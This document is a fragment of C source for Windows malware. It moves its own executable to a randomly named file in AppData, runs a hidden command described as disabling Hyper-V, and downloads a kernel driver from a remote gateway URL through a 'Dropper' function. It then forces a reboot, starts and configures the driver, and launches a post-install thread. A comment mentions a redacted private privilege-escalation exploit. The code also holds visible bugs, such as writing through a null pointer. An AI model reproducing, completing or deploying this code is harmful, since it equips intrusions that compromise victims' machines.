	ZeroBuffer(&objattr, sizeof(OBJECT_ATTRIBUTES));
	MY_UNICODE_STRING FilePath;
	RtlInitUnicodeString(&FilePath, MY_DRIVER);
	IO_STATUS_BLOCK isb;
	ZeroBuffer(&isb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&objattr, &FilePath, 0, NULL, NULL);
	NTSTATUS rv = NtCreateFile(&hDriver, FILE_APPEND_DATA | FILE_WRITE_ACCESS | SYNCHRONIZE, &objattr, &isb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (NT_SUCCESS(rv)) {
		PCONFIG config = NULL;
		ZeroBuffer(config, sizeof(CONFIG));
		WCHAR szFileName[MAX_PATH];
		ZeroBuffer(szFileName, MAX_PATH);


		_GetModuleFileName(NULL, szFileName, MAX_PATH);
		if (_GetLastError() == ERROR_SUCCESS) {
			config->ProgramPath = szFileName;
			DWORD dwBytesRet = 0;
			rv = DeviceIoControl(hDriver, CONFIGURE, config, sizeof(PCONFIG), NULL, 0, &dwBytesRet, NULL);
			NtClose(hDriver);
			return TRUE;
		}
	}
	return FALSE;
}



BOOL IsRunning()
{
	BOOL rv = FALSE;
	SC_HANDLE hSCM = _OpenSCManagerW(0, 0, SC_MANAGER_ALL_ACCESS);
	if (hSCM) {
		SC_HANDLE hService = _OpenServiceW(hSCM, SERVICE, SERVICE_QUERY_STATUS);
		if (hService) {
			SERVICE_STATUS ss;
			rv = _QueryServiceStatus(hService, &ss) && ss.dwCurrentState == SERVICE_STOPPED;
			_CloseServiceHandle(hService);
		}
		_CloseServiceHandle(hSCM);
	}
	return rv;
}



BOOL Install()
{

	WCHAR filePath[MAX_PATH], szCurrentPath[MAX_PATH], szAppDataPath[MAX_PATH];

	ZeroBuffer(filePath, MAX_PATH);
	ZeroBuffer(szCurrentPath, MAX_PATH);
	ZeroBuffer(szAppDataPath, MAX_PATH);

	_GetModuleFileName(NULL, filePath, MAX_PATH);
	_ExpandEnvironmentStringsW(APPDATA_STR, szAppDataPath, MAX_PATH);
	_GetCurrentDirectoryW(MAX_PATH, szCurrentPath);
	
	if (szCurrentPath != szAppDataPath) {
		WCHAR RandomFileName[8];
		ZeroBuffer(RandomFileName, 8);
		_RtlGenRandom(RandomFileName, 7);
		_wsprintfW(szAppDataPath, EXE_PATH_STR, szAppDataPath, RandomFileName);
		MoveFileWithProgressW(filePath, szAppDataPath, NULL, NULL, MOVEFILE_WRITE_THROUGH);
	}

	WCHAR szDriverName[] = DRIVER_NAME;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	// change this to NtCreateFile and check if IO_STATUS_BLOCK -> information is FILE_EXISTS.

	hFile = CreateFileW(szDriverName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		// send da data to the driver...

		CloseHandle(hFile);
		return TRUE;
	}
	/*
	* If the Driver File Exists, just return TRUE.. this means it was downloaded before.........
	*/

	BOOL Admin = QueryAdminStatus();
	if (!Admin) {
		/*
		* [redacted code] private LPE was here :)
		*/
	}
	/*
	* Disable Hyper-V as well...
	*/
	WCHAR wCommand[] = COMMAND;
	STARTUPINFO si;
	ZeroBuffer(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	ZeroBuffer(&pi, sizeof(PROCESS_INFORMATION));
	/*
	* Change to NtCreateProcess.
	*/
	if (_CreateProcessW(NULL, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		// change to NtWaitForSingleObject
		_WaitForSingleObject(pi.hProcess, INFINITE);
		DWORD dwExitCode = 0;
		if (_GetExitCodeProcess(pi.hProcess, &dwExitCode)) {
			if (dwExitCode) {
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);
				return FALSE;
			}
		}
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	DWORD dwBuf = 0;
	// 
	WCHAR szDriverPath[MAX_PATH];
	ZeroBuffer(szDriverPath, MAX_PATH);
	WCHAR szCurrentDir[MAX_PATH];
	ZeroBuffer(szCurrentDir, MAX_PATH);
	_GetCurrentDirectoryW(MAX_PATH, szCurrentDir);
	_wsprintfW(szDriverPath, dll_path_str, szCurrentDir, DRIVER_NAME);
	if (Dropper(GATEWAY_URL, szDriverPath)) {
		// change this to sending a message to CSRSS...
		if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
			return FALSE;
		}

	}
}


void doggo(){
	if (ResolveImports()) {
		if (!IsRunning()) {
			if (Install()) {
				_RtlGenRandom(UserAgent, 2);
				StartDriver(NULL);
				HANDLE hPostRoutine = NULL;
				NtCreateThreadEx(&hPostRoutine, GENERIC_ALL, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)PostRoutine, NULL, FALSE, 0, 0, 0, NULL);
				LARGE_INTEGER li;
				ZeroBuffer(&li, sizeof(LARGE_INTEGER));
				li.QuadPart = INFINITE;
				WaitForSingleObject(hPostRoutine, INFINITE);
				NtClose(hPostRoutine);
			}
		}

	}
	return;
}
